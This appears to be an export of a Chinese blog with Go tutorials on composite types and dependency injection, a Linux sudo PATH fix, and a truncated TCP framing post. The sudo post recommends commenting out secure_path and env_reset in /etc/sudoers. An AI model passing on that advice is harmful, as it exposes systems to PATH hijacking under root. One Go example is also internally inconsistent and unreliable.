    <content><![CDATA[<p>闲着无事，随便写写，初学Go，望各位大神轻喷！Go自带的几个复合数据类型，基本数据类型咱就不说了，大部分语言常见的几种复合数据类型大概有数组、字典、对象等，不同语言叫法不一样，用法也有差异，比如说PHP里面数组其实严格来说不算数组。</p>
<a id="more"></a>

<h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1.数组"></a>1.数组</h2><p>Go里面的数组和C类似，是由<strong>有序</strong>的<strong>固定长度</strong>的<strong>特定类型</strong>元素组成。画重点，固定长度和特定类型。在很多弱类型的语言里面，数组非常随意，PHP的数组本质上是一个hash table，和C的数组差异太大，所以写惯了PHP再写Go的话这点需要注意。</p>
<h3 id="基础用法1"><a href="#基础用法1" class="headerlink" title="基础用法1:"></a>基础用法1:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a [<span class="number">5</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    a[<span class="number">2</span>] = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> b [<span class="number">10</span>]<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0</span>] = <span class="string">"a1"</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="string">"b2"</span></span><br><span class="line">    b[<span class="number">2</span>] = <span class="string">"c5"</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, a)</span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, b)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line">[a1 b2 c5       ]</span><br></pre></td></tr></table></figure>
<p>从语法上看，Go定义数组的类型放在后面，这点写惯C系语言的估计蛋疼。数组也是通过索引下标访问，如果不初始化赋值的话，默认情况下，int类型的元素是0,string类型是空字符串。</p>
<h3 id="基础用法2"><a href="#基础用法2" class="headerlink" title="基础用法2"></a>基础用法2</h3><p>我们也可以不先定义，直接使用字面量初始化数组：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v"</span>, a)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">7</span>]</span><br></pre></td></tr></table></figure>
<p>在这种情况下，我们可以省略长度,使用3个点代替，编译器会自动判断。</p>
<h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p>主要有两种方式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(a); i++ &#123;</span><br><span class="line">        fmt.Print(a[i])</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">        fmt.Print(k, <span class="string">"-&gt;"</span>, v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果知道长度的话可以使用for循环，否则可以使用for range 这种语法。</p>
<h3 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h3><p>Go内置了一些函数可以操作数组，如果你使用了IDE的话，可以“点”出来：</p>
<img src = "/images/old/5f6e3e27ly1fzgltdja32j20g4054wen.jpg" />

<p>然而，append并不是用来操作数组的，其实它是用来操作变长数组的，即slice, 又称切片。</p>
<h2 id="2-Slice（切片）"><a href="#2-Slice（切片）" class="headerlink" title="2.Slice（切片）"></a>2.Slice（切片）</h2><p>传统的数组长度固定，所以实际用途并不多，除非你明确知道自己想要多长的数组，很多时候我们需要的是一个可以改变长度大小的数组，在Go里面这类型被称为切片。</p>
<p>slice其实是从数组而来的，它和数组非常像，区别就在于slice没有固定长度，非常方便，所以平时一般都是用这个比较多。</p>
<h3 id="基础用法1-1"><a href="#基础用法1-1" class="headerlink" title="基础用法1:"></a>基础用法1:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">append</span>(a, <span class="number">2</span>)</span><br><span class="line">    a = <span class="built_in">append</span>(a, <span class="number">1</span>)</span><br><span class="line">    a = <span class="built_in">append</span>(a, <span class="number">4</span>)</span><br><span class="line">    a = <span class="built_in">append</span>(a, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v"</span>, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>区别就在于slice在定义的时候不需要指定长度，也不用3个点，但是这就意味着你不能使用索引下标的方法去赋值了，可以使用append函数去追加元素。</p>
<p>而且在使用slice的也需要注意下标，如果大于slice的长度也会出现 <code>panic: runtime error: index out of range</code>。</p>
<h3 id="基础用法2-1"><a href="#基础用法2-1" class="headerlink" title="基础用法2"></a>基础用法2</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line">    s1 := a[<span class="number">0</span>:]</span><br><span class="line"></span><br><span class="line">    s2 := a[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    s3 := a[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, a)</span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, s1)</span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, s2)</span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, s3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>slice可以使用<code>[start:end]</code>这种语法从一个数组里面生成，比如<code>a[1:5]</code>意思是生成一个包含数组索引1到5的之间元素的slice。</p>
<blockquote>
<p>在Go里面不同长度但是同一类型的数组是不同类型的，比如你定义了2个int数组，一个长度为5，一个长度为10，他们其实并不是同一个类型，虽然都是int类型。cannot use a (type [10]int) as type [5]int in argument</p>
</blockquote>
<p>所以在大部分时候我们需要的是一个slice，并不是一个数组。虽然这个2个用法基本上一毛一样。。。</p>
<h2 id="3-Map"><a href="#3-Map" class="headerlink" title="3.Map"></a>3.Map</h2><p>在很多语言里面，map被叫作字典，这个中文名称很亲切，字典就是一种key value结构，小时候大家都用过新华字典，字典的特征就是每一个字都对应一个解释。但是Go的map是无序的，这点大家需要注意。如果有童鞋写过PHP，会发现这个数据类型类似PHP里面的关联数组。</p>
<p>在Go里面，它和slice的区别就是slice的索引是数值，map的索引类型就丰富了，基本上常用数据类型都支持，甚至包括结构体。</p>
<h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>和其它数组类型一样，map也支持先定义后赋值，或者直接使用字面量创建。但是如果使用先定义后赋值这种方式，map需要使用make初始化。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> m1 <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    m1 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    m1[<span class="string">"name"</span>] = <span class="string">"Golang"</span></span><br><span class="line">    m1[<span class="string">"address"</span>] = <span class="string">"BeiJin"</span></span><br><span class="line"></span><br><span class="line">    m2 := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"GoLand"</span>,</span><br><span class="line">        <span class="string">"addr"</span>: <span class="string">"ShangHai"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, m1)</span><br><span class="line">    fmt.Printf(<span class="string">"%v"</span>, m2)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line"><span class="keyword">map</span>[name:Golang address:BeiJin]</span><br><span class="line"><span class="keyword">map</span>[name:GoLand addr:ShangHai]</span><br></pre></td></tr></table></figure>

<p>map可以使用for range 语法遍历，但是需要注意的是每次遍历的顺序是无序的。</p>
<p>如何判断一个key是否存在map里面？在PHP里面我们有一个array_key_exists函数，在Go里面写法略有不同：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">age, ok := m1[<span class="string">"age"</span>]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">    fmt.Println(<span class="string">"age 不存在"</span>, age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实如果你不判断是否存在直接取也可以，并不会报错，只不过获取到的值是一个对应类型的零值。</p>
<h2 id="4-结构体"><a href="#4-结构体" class="headerlink" title="4.结构体"></a>4.结构体</h2><p>Go的结构体也类似C，类似于现在很多面向对象的语言里面的类，往往用来存储一组相关联的数据，Go虽然不是一个完全面向对象的语言，但是使用结构体可以实现类似效果。</p>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Goods <span class="keyword">struct</span> &#123;</span><br><span class="line">    name    <span class="keyword">string</span></span><br><span class="line">    price   <span class="keyword">int</span></span><br><span class="line">    pic     <span class="keyword">string</span></span><br><span class="line">    address <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> goods Goods</span><br><span class="line">    goods.name = <span class="string">"商品1"</span></span><br><span class="line">    goods.price = <span class="number">100</span></span><br><span class="line">    goods.pic = <span class="string">"http://xxxx.jpg"</span></span><br><span class="line">    goods.address = <span class="string">"中国"</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v\n"</span>, goods)</span><br><span class="line"></span><br><span class="line">    goods2 := Goods&#123;</span><br><span class="line">        name:    <span class="string">"商品2"</span>,</span><br><span class="line">        price:   <span class="number">200</span>,</span><br><span class="line">        pic:     <span class="string">"http://xxxx.png"</span>,</span><br><span class="line">        address: <span class="string">"日本"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v"</span>, goods2)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">&#123;商品<span class="number">1</span> <span class="number">100</span> http:<span class="comment">//xxxx.jpg 中国&#125;</span></span><br><span class="line">&#123;商品<span class="number">2</span> <span class="number">200</span> http:<span class="comment">//xxxx.png 日本&#125;</span></span><br></pre></td></tr></table></figure>
<p>先定义后赋值或者字面量赋值都可以，值得一提的是在Go里面如果结构体或者其属性的首字母大写则表示该结构体或者属性可以被导出，也就是被其它包使用。结构体里面的属性成员的类型也可以是结构体，这就变相实现了类的继承。</p>
<p>既然结构体和类差不多，那类的方法在哪里定义呢？这点Go实现的就比较巧妙了！</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g Goods)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> g.name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只需要在函数的前面放一个变量，就变成了方法。在很多语言里面，函数和方法区分不是很明显，大部分时候我们都是混着叫，但是在Go里面，方法指的是针对某一类型的函数。比如在上面的例子里面，这个<strong>getName</strong>函数就是针对<strong>Goods</strong>结构体的,用面向对象的说法就是一个类方法。所以我们可以使用 <code>goods.getName()</code>的形式调用这个方法。</p>
<blockquote>
<p>上面的代码里那个附加的参数p，叫做方法的接收器（receiver），早期的面向对象语言留下的遗产将调用一个方法称为“向一个对象发送消息”。<br> 在Go语言中，我们并不会像其它语言那样用this或者self作为接收器；我们可以任意的选择接收器的名字。由于接收器的名字经常会被使用到，所以保持其在方法间传递时的一致性和简短性是不错的主意。这里的建议是可以使用其类型的第一个字母。</p>
</blockquote>
<p>在Go里面我们可以为任何类型定义方法，无论是常见的int、string，还是map、struct都没问题，下面的例子里面就是为int类型扩展一个方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyInt <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    myInt := MyInt(<span class="number">10</span>)</span><br><span class="line">    res := myInt.add(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%d"</span>, res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m MyInt)</span> <span class="title">add</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(m) + a</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line"><span class="number">110</span></span><br></pre></td></tr></table></figure>
<p>我们无法直接使用基本数据类型，但是我们可以起一个别名，纯属娱乐！</p>
<h2 id="5-JSON"><a href="#5-JSON" class="headerlink" title="5.JSON"></a>5.JSON</h2><p>严格来说，JSON并不是一种数据类型，但是json是现在最流行的数据交换格式，Go对json的支持也很好，在Go里面主要通过结构体生成json，我们也可以把一个json转换成结构体。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Goods <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name    <span class="keyword">string</span></span><br><span class="line">    Price   <span class="keyword">int</span></span><br><span class="line">    Address <span class="keyword">string</span> <span class="string">`json:"address2"`</span></span><br><span class="line">    Tag     <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    goods := Goods&#123;</span><br><span class="line">        <span class="string">"商品1"</span>, <span class="number">100</span>, <span class="string">"中国"</span>, <span class="string">"特价"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bytes, err := json.Marshal(goods)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s"</span>, bytes)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">&#123;<span class="string">"Name"</span>:<span class="string">"商品1"</span>,<span class="string">"Price"</span>:<span class="number">100</span>,<span class="string">"address2"</span>:<span class="string">"中国"</span>,<span class="string">"Tag"</span>:<span class="string">"特价"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>把结构体转换成json可以使用Marshal方法，有一点需要注意: 结构体的属性成员首字母必须大写，但是可以使用注解的Tag标注转换成json之后的key名称。</p>
<p>json字符串转换成结构体步骤差不多：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Goods <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name    <span class="keyword">string</span></span><br><span class="line">    Price   <span class="keyword">int</span></span><br><span class="line">    Address <span class="keyword">string</span> <span class="string">`json:"address2"`</span></span><br><span class="line">    Tag     <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    jsonStr := <span class="string">`&#123;"Name":"商品1","Price":100,"address2":"中国","Tag":"特价"&#125;`</span></span><br><span class="line"></span><br><span class="line">    goods := Goods&#123;&#125;</span><br><span class="line"></span><br><span class="line">    err := json.Unmarshal([]<span class="keyword">byte</span>(jsonStr), &amp;goods)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%v"</span>, goods)</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">&#123;商品<span class="number">1</span> <span class="number">100</span>  特价&#125;</span><br></pre></td></tr></table></figure>
<p>这在我们平时写接口或者请求接口的时候非常好使，简单易用！</p>
<p>好了，今天就介绍这么多了，谢谢！</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>解决sudo command not found 报错</title>
    <url>/2019/linux/sudo-command-not-found.html</url>
    <content><![CDATA[<p>偶尔发现的一个问题，平时主要使用 <strong>Ubuntu</strong> 操作系统，有时候安装一些软件会用加一些自定义PATH，往往为了方便都会把配置写到  <strong>/etc/environment</strong> 里面,这样所有用户包括root都有效：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ cat &#x2F;etc&#x2F;environment </span><br><span class="line">PATH&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:</span><br><span class="line">&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;home&#x2F;jwang&#x2F;MyBin:&#x2F;opt&#x2F;go&#x2F;bin&quot;</span><br><span class="line">export GOPATH&#x3D;&#x2F;home&#x2F;jwang&#x2F;Go</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>比如说安装了go，在使用 <strong>sudo go</strong> 这样命令的时候会报错，但是切换到 root 用户却没有问题，使用普通用户也没问题，查了一下发现原来 sudo 里面有一些配置：</p>
<img src="/images/old/3571187-2c5fdea0a1fd3101.png" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure>
<img src="/images/old/3571187-319d779b9cae7fc2.png" />

<p>在这个 <strong>/etc/sudoers</strong> 文件里面，有一个secure_path配置，大家一看就知道了，它的意思当你使用 <strong>sudo+command</strong> 这种形式执行命令的时候会从其配置的路径里面寻找命令，肯定是没有你自定义的PATH的，这个主要是安全考虑。</p>
<p><strong>解决方法</strong>有几种：</p>
<ol>
<li><p>直接把自定义PATH路径配置在secure_path里面，简单粗暴，就是有点麻烦</p>
</li>
<li><p>将 Defaults env_reset 改成 Defaults !env_reset 取消掉对PATH变量的重置，然后在.bashrc中最后添加alias sudo=’sudo env PATH=$PATH’，这个感觉更麻烦</p>
</li>
<li><p>直接把这3行注释掉，经测试完全没有任何问题</p>
</li>
</ol>
<p>我是采用第3种方式解决的，非常好用，暂时未发现问题！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Sudo</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang的依赖注入简介</title>
    <url>/2019/coding/golang/golang-di.html</url>
    <content><![CDATA[<p>DI - Dependency Injection，即“依赖注入”，是指组件之间依赖关系由容器在运行期决定，与此同时还有一个叫作IOC的词汇，IOC即控制反转。</p>
<p>理论上讲，这2个概念都是基于OOP编程而产生的思想，在OOP编程里面，我们强调对象之间的依赖关系，比如说对象B依赖对象A的某些功能，我们就说B依赖A。</p>
<p>DI毕竟不是Go语言的专利，它是一种编程思想，在很多语言里面都有体现和实现，相信很多具有编程经验的人也有所了解，下面咱们直接开始讲在Go语言里面怎么使用DI。</p>
<a id="more"></a>

<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><p>Golang的DI目前主要有2种方式，一种是使用反射特性实现，代表开源项目有facebook/inject，还有uber/dig。另一种是代码自动生成，代表开源项目有google/wire。</p>
<p>下面咱们看一个案例：</p>
<p>由于Go并不是纯OOP语言，所以这里使用struct模拟对象的概念，有3个对象，其中App依赖DB和Redis。</p>
<p>DB：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Object</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DB <span class="keyword">struct</span> &#123;</span><br><span class="line">    config <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(DB)</span> <span class="title">Get</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am DB"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Redis：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Object</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Redis <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Redis)</span> <span class="title">Get</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am Redis"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>App:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Object</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> App <span class="keyword">struct</span> &#123;</span><br><span class="line">    r  Redis</span><br><span class="line">    db DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p App)</span> <span class="title">Work</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I can work"</span>)</span><br><span class="line">    p.db.Get()</span><br><span class="line">    p.r.Get()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果不使用依赖注入，我们只能手动解决依赖，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"di/Object"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    app := Object.App&#123;</span><br><span class="line">        R:  Object.Redis&#123;&#125;,</span><br><span class="line">        DB: Object.DB&#123;&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    app.Work()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种写法并无太大问题，简单安全，不过项目非常大的时候，对象之间依赖关系复杂，手动解决依赖可能非常麻烦，这时候就需要自动注入依赖了。</p>
<h2 id="facebook-inject"><a href="#facebook-inject" class="headerlink" title="facebook/inject"></a>facebook/inject</h2><p>这是Facebook开源的一个项目，地址：github.com/facebookgo/inject</p>
<p>它使用struct的tag声明依赖，第一个无值语法是针对关联类型的单例依赖的常见情况。第二个触发器创建关联类型的私有实例。最后一个是要求一个名为 “dev logger” 的依赖关系。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;inject:&quot;&quot;&#96;</span><br><span class="line">&#96;inject:&quot;private&quot;&#96;</span><br><span class="line">&#96;inject:&quot;dev logger&quot;&#96;</span><br></pre></td></tr></table></figure>

<p>下面以App为例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> App <span class="keyword">struct</span> &#123;</span><br><span class="line">    R  Redis <span class="string">`inject:""`</span></span><br><span class="line">    DB DB <span class="string">`inject:""`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"di/Object"</span></span><br><span class="line">    <span class="string">"github.com/facebookgo/inject"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> g inject.Graph</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> app Object.App</span><br><span class="line"></span><br><span class="line">    _ = g.Provide(</span><br><span class="line">        &amp;inject.Object&#123;Value: &amp;Object.DB&#123;&#125;,&#125;,</span><br><span class="line">        &amp;inject.Object&#123;Value: &amp;Object.Redis&#123;&#125;,&#125;,</span><br><span class="line">        &amp;inject.Object&#123;Value: &amp;app,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    _ = g.Populate()</span><br><span class="line"></span><br><span class="line">    app.Work()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给struct tag只是第一步，在程序启动的时候需要先注入依赖。</p>
<h3 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h3><p>一般说到依赖注入必然会用到反射，说到Go的反射，大多数人都会说性能很差。</p>
<p>这个inject库也是用到了反射原理，性能会不会很差呢？</p>
<p>其实还是看用法，官方推荐在应用程序启动的时候注入所有依赖，而不是在运行中注入依赖，这样即使慢，也只是程序每次启动的时候慢，并不影响后续的运行情况。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang处理TCP“粘包”问题</title>
    <url>/2019/coding/golang/golang-tcp-package.html</url>
    <content><![CDATA[<h2 id="1-什么是粘包？"><a href="#1-什么是粘包？" class="headerlink" title="1.什么是粘包？"></a>1.什么是粘包？</h2><p>“粘包”这个说法已经被诟病很久了，既然坊间流传这个说法咱们就沿用吧，关于这个问题比较准确的解释可以参考下面几点：</p>
<ol>
<li>TCP是流传输协议,是一种面向连接的、可靠的、基于字节流的传输层通信协议</li>
<li>TCP没有包的概念，它只负责传输字节序列，UDP是面向数据报的协议，所以不存在拆包粘包问题</li>
<li>应该由应用层来维护消息和消息的边界，即需要一个应用层协议，比如HTTP</li>
</ol>
<p>所以，本质上这是一个没有正确使用TCP协议的而产生的问题，有网友说了一句非常形象的话：“打开家里的水龙头， 看着自来水往下流， 然后你告诉我， 看， 自来水粘在一起了， 不是有病？”</p>
<a id="more"></a>

<h2 id="2-如何解决粘包？"><a href="#2-如何解决粘包？" class="headerlink" title="2.如何解决粘包？"></a>2.如何解决粘包？</h2><p>通常来说，一般有下面几种方式：</p>
<ol>
